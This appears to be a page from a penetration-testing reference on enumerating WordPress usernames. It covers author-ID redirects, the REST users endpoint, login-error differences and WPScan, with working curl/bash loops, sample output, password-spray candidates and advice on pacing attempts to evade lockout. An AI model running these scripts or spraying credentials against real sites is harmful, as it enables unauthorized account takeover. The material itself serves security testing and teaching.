@@ -1,0 +1,309 @@
+---
+title: User Enumeration
+description: Discovering valid WordPress usernames before brute force - the ?author=N redirect oracle, the /wp-json/wp/v2/users REST endpoint, login-form error message differential, and WPScan's automated user mode.
+mitre: [T1087, T1589.003]
+d3fend: [D3-IDA]
+impact: [CredentialTheft]
+sidebar:
+  order: 5
+  label: User Enumeration
+---
+
+## TL;DR
+
+Brute-forcing WordPress without a valid username list is wasteful. Enumerate users first; spray credentials against confirmed users second. Four sources, each with different stealth and reliability characteristics:
+
+```
+# 1. The ?author=N redirect oracle (the most reliable + most common)
+for i in $(seq 1 20); do
+  curl -sI "http://target/?author=$i" \
+    | awk -v i="$i" '/^Location:/ {print "id=" i ": " $2}'
+done
+
+# 2. The REST API user endpoint
+curl -s 'http://target/wp-json/wp/v2/users' | jq -r '.[] | "\(.id) \(.slug) \(.name)"'
+
+# 3. Login error differential
+#    Invalid user:     "The username <user> is not registered..."
+#    Valid user:       "The password you entered for <user> is incorrect..."
+
+# 4. WPScan
+wpscan --url http://target --enumerate u
+```
+
+Success indicator: a list of `<id> <slug> <display name>` triples covering at least the admin user (ID 1) and one or more author accounts.
+
+## Why enumerate users first
+
+A few reasons:
+
+1. **Brute-force without a username target is "spray everything against everything"** - wasteful and noisy. Password-spray with a verified user list is targeted and effective.
+2. **Lockout policies usually trigger per-user, not per-source-IP.** Spraying one common password across 20 known users gets you 20 chances; brute-forcing `admin:wordlist` with no other usernames in the mix may lock just one account but still alert on the failure rate.
+3. **The admin user is the highest-value target.** Default admin username `admin` is sometimes renamed. Knowing the rename target is required for any brute-force attempt against the actual administrator.
+4. **Display name vs. login slug.** WordPress shows the "Display Name" on the front-end (e.g., "John Smith") but the login uses the "slug" (e.g., `jsmith`). Enumerating both is required to brute-force correctly.
+
+## Source 1 - `?author=N` redirect oracle
+
+WordPress maps the URL parameter `author=N` (where N is a numeric user ID) to that user's archive page. The mapping is:
+
+```
+?author=1  →  /index.php/author/<slug>/   (when the user has any published posts)
+?author=1  →  /wp-login.php                (when the user has no posts)
+?author=1  →  404                          (when user ID 1 doesn't exist)
+```
+
+The redirect's `Location:` header *contains the user's slug*. That's the operator-relevant detail.
+
+```shell
+curl -sI 'http://blog.inlanefreight.com/?author=1'
+```
+
+```
+HTTP/1.1 301 Moved Permanently
+Date: Wed, 13 May 2020 20:47:08 GMT
+Server: Apache/2.4.29 (Ubuntu)
+X-Redirect-By: WordPress
+Location: http://blog.inlanefreight.com/index.php/author/admin/
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+```
+
+The `Location:` is `.../author/admin/` - user ID 1's slug is `admin`.
+
+For non-existent IDs:
+
+```shell
+curl -sI 'http://blog.inlanefreight.com/?author=999'
+```
+
+```
+HTTP/1.1 404 Not Found
+Date: Wed, 13 May 2020 20:47:14 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+...
+```
+
+The 404 vs. 301 distinction is unambiguous. Iterate over a range of IDs:
+
+```shell
+for i in $(seq 1 20); do
+  loc=$(curl -sI "http://target/?author=$i" | awk 'tolower($1)=="location:" {print $2}' | tr -d '\r')
+  if [ -n "$loc" ]; then
+    slug=$(echo "$loc" | grep -oE 'author/[^/]+' | cut -d/ -f2)
+    echo "id=$i  slug=$slug"
+  fi
+done
+```
+
+```
+id=1   slug=admin
+id=2   slug=ch4p
+id=4   slug=erika
+id=7   slug=david
+```
+
+Gaps (id=3, id=5, id=6 missing) just mean those user IDs were deleted or never created. Common in real-world targets where users were added and removed over time.
+
+### What stops this technique
+
+A few defenses, in order of how often they're deployed:
+
+| Defense | Effect |
+| --- | --- |
+| Security plugin (Wordfence, iThemes Security) with "Hide username from author archive" | `?author=1` returns the homepage or 404 regardless of user existence |
+| `redirect_canonical` filter customized to suppress slug | `Location:` header returns the post archive URL without the slug |
+| `users_can_register = off` AND no published posts by any user | `?author=N` for valid IDs redirects to `/wp-login.php` instead of to the slug |
+
+When the redirect oracle is blocked, fall through to source 2.
+
+### Confirming admin user identity
+
+The display name shown next to a post byline is a hint but not always the slug. Hover over the byline (or read the `<a href>`):
+
+```html
+<span class="post-author">by <a href="http://target/author/jsmith/" rel="author">John Smith</a></span>
+```
+
+The link points to `/author/jsmith/` - the slug is `jsmith`, not "John Smith." `jsmith` is what you'd submit as the username to `wp-login.php`.
+
+## Source 2 - REST API `/wp-json/wp/v2/users`
+
+WordPress 4.7+ exposes a `/wp-json/wp/v2/users` endpoint via the REST API. Pre-4.7.2, this returned every user that had ever published a post (which often included accounts that no longer had posts but had at some point). Post-4.7.2, it returns only users with currently-published posts by default.
+
+```shell
+curl -s 'http://target/wp-json/wp/v2/users' | jq -r '.[] | "\(.id)\t\(.slug)\t\(.name)\t\(.link)"'
+```
+
+```
+1   admin       Administrator   http://target/author/admin/
+2   ch4p        ch4p            http://target/author/ch4p/
+4   erika       Erika Smith     http://target/author/erika/
+7   david       David Brown     http://target/author/david/
+```
+
+This is the cleanest source when it works:
+
+- `id` - the numeric ID (same one used in `?author=N`)
+- `slug` - login username
+- `name` - display name (sometimes the real name, sometimes the same as the slug)
+- `link` - author archive URL (useful for verifying the slug)
+
+### When the endpoint is restricted
+
+WordPress provides a filter (`rest_authentication_errors`) that security plugins use to lock down the REST API. When restricted:
+
+```shell
+$ curl -s 'http://target/wp-json/wp/v2/users' | jq
+{
+  "code": "rest_user_cannot_view",
+  "message": "Sorry, you are not allowed to list users.",
+  "data": { "status": 401 }
+}
+```
+
+That 401 still confirms WordPress is running and the REST endpoint exists - it just won't return users. Move to source 1 or source 3.
+
+### Per-user lookup
+
+Even when listing is blocked, *individual* user lookup by ID is sometimes still allowed:
+
+```shell
+curl -s 'http://target/wp-json/wp/v2/users/1' | jq
+```
+
+If ID 1 returns user data while the list endpoint returns 401, the filter is misconfigured and per-ID lookup is the workaround:
+
+```shell
+for i in $(seq 1 50); do
+  resp=$(curl -s "http://target/wp-json/wp/v2/users/$i")
+  echo "$resp" | jq -e '.slug // empty' >/dev/null 2>&1 \
+    && echo "id=$i $(echo $resp | jq -r .slug)"
+done
+```
+
+## Source 3 - login error message differential
+
+WordPress's `wp-login.php` returns different error strings for "user doesn't exist" vs. "password is wrong":
+
+```shell
+# Submit a bogus username + bogus password
+curl -s 'http://target/wp-login.php' \
+  --data 'log=nonexistent_user_xxx&pwd=wrong&wp-submit=Log+In' \
+  | grep -oE 'is not registered|password you entered'
+```
+
+| Response contains | Meaning |
+| --- | --- |
+| `<strong>Error</strong>: The username <user> is not registered` | User doesn't exist |
+| `<strong>Error</strong>: The password you entered for the username <user> is incorrect` | User exists, password wrong |
+| `Username and password are incorrect` (or similar generic) | Differential disabled by hardening |
+
+### Detection script
+
+```shell
+for user in $(cat candidate_users.txt); do
+  resp=$(curl -s -X POST "http://target/wp-login.php" \
+              --data "log=${user}&pwd=DefinitelyWrongPwd123&wp-submit=Log+In")
+  if echo "$resp" | grep -q "is not registered"; then
+    echo "INVALID: $user"
+  elif echo "$resp" | grep -q "password you entered"; then
+    echo "VALID:   $user"
+  else
+    echo "UNKNOWN: $user"
+  fi
+done
+```
+
+This source confirms users from a candidate list without depending on the redirect oracle or REST API. The candidate list can come from:
+
+- Email-format derivation against employee names (e.g., `firstname.lastname`, `flastname`)
+- Common admin usernames (`admin`, `administrator`, `wp-admin`, `superuser`, `root`)
+- Company-specific patterns (the company name, `<companyname>admin`)
+
+### The hardened response
+
+WordPress 5.x added a `wp_login_errors` filter that some security plugins use to homogenize errors:
+
+```html
+<strong>Error</strong>: The username or password you entered is incorrect.
+```
+
+When errors are homogenized, this source is dead. Fall back to source 1 or 2.
+
+## Source 4 - WPScan automation
+
+```shell
+wpscan --url http://target --enumerate u
+```
+
+WPScan combines multiple sources internally:
+
+- Passive: scrape `<a class="author">` links from rendered posts
+- Active: iterate `?author=1..` until 404
+- Active: query `/wp-json/wp/v2/users` if the REST API is open
+- Active (with `--enumerate u`): hit `wp-login.php` with bogus passwords and check for the differential
+
+Sample output:
+
+```
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <==========> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] david
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] roger
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+```
+
+The "Found By" / "Confirmed By" output tells you which sources contributed - useful for assessment reports and for debugging when one source fails but another succeeds.
+
+To limit the ID brute-force range:
+
+```shell
+wpscan --url http://target --enumerate u1-50
+```
+
+Default range is 1-10. For a site with many authors over years, push it higher (1-100 or beyond).
+
+## XML-RPC user enumeration
+
+`xmlrpc.php` can also be used for user enumeration, but it's covered separately in [XML-RPC abuse](/codex/web/wordpress/xmlrpc-abuse/) because the mechanism is brute-force-style rather than oracle-style - you submit a (username, password) pair and the server's response tells you whether the username existed and whether the password was right. This is louder than the oracle methods above but useful when others are blocked.
+
+## What to do with the user list
+
+Once you have confirmed usernames:
+
+1. **Identify the admin.** ID 1 is the default admin user. Sometimes renamed; sometimes a different ID is the actual admin. The `roles` field in the REST response (when available) confirms it.
+
+2. **Build a password candidate list.** For each user:
+   - Common patterns: `<user>`, `<user>123`, `<user>2024!`, `<companyname>2024!`
+   - Seasonal: `Spring2024!`, `Summer2024!`, etc.
+   - Welcome variants: `Welcome1`, `Welcome123`, `Welcome2024!`
+
+3. **Choose the brute-force vector.** Login via `wp-login.php` or via `xmlrpc.php` - see [Login brute-force](/codex/web/wordpress/login-bruteforce/).
+
+4. **Calibrate to lockout policy.** If the admin uses iThemes Security with brute-force protection, more than a few attempts will block your IP. Spray patterns (one password attempt per user per hour) work better than rapid-fire.
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| `?author=` oracle (single user) | `curl -sI 'http://target/?author=1' \| grep -i location` |
+| `?author=` oracle (sweep) | bash loop iterating IDs 1-20+ |
+| REST users (full list) | `curl -s 'http://target/wp-json/wp/v2/users' \| jq` |
+| REST users (per-ID) | `curl -s 'http://target/wp-json/wp/v2/users/1' \| jq` |
+| Login error differential | `curl -s 'http://target/wp-login.php' --data 'log=USER&pwd=wrong&wp-submit=Log+In' \| grep -oE 'is not registered\|password you entered'` |
+| WPScan users | `wpscan --url http://target --enumerate u` |
+| WPScan users (wider range) | `wpscan --url http://target --enumerate u1-100` |
